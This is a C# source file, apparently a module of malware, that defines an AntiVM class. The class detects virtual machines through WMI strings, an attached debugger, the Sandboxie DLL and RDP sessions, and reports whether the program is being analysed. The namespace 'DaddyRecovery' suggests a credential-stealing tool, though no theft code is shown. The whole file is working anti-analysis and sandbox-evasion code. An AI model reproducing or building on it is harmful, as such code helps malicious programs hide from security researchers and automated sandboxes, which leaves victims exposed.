namespace DaddyRecovery.Sticks
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Management;
    using System.Windows.Forms;
    using Helpers;

    public static class AntiVM
    {
        private static bool GetDetectVirtualMachine()
        {
            using (ManagementObjectCollection mb = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
            {
                foreach (ManagementBaseObject mbj in mb)
                {
                    try
                    {
                        string str = mbj["Manufacturer"]?.ToString().ToLower();
                        bool strTo = mbj["Model"].ToString().ToLower().Contains("virtual");
                        if ((str.Equals("microsoft corporation") && strTo) || str.Contains("vmware") || mbj["Model"].ToString().Equals("VirtualBox"))
                        {
                            return true;
                        }
                    }
                    catch (Exception) { return false; }
                }
            }
            return false;
        }
        private static bool IsDebuggerAttached(Process process)
        {
            try
            {
                bool isDebuggerAttached = false;
                return NativeMethods.CheckRemoteDebuggerPresent(process.Handle, ref isDebuggerAttached) ? isDebuggerAttached : false;
            }
            catch (Exception) { return false; }
        }
        private static bool IsRdpAvailable => SystemInformation.TerminalServerSession == true ? true : false;
        private static bool SBieDLL => Process.GetProcessesByName("wsnm").Length <= 0 && NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() == 0 ? false : true;

        public static bool GetCheckVMBot()
        {
            using (var proc = Process.GetCurrentProcess())
            {
                return !(!IsDebuggerAttached(proc) && !SBieDLL && !IsRdpAvailable && !GetDetectVirtualMachine());
            }
        }
    }
}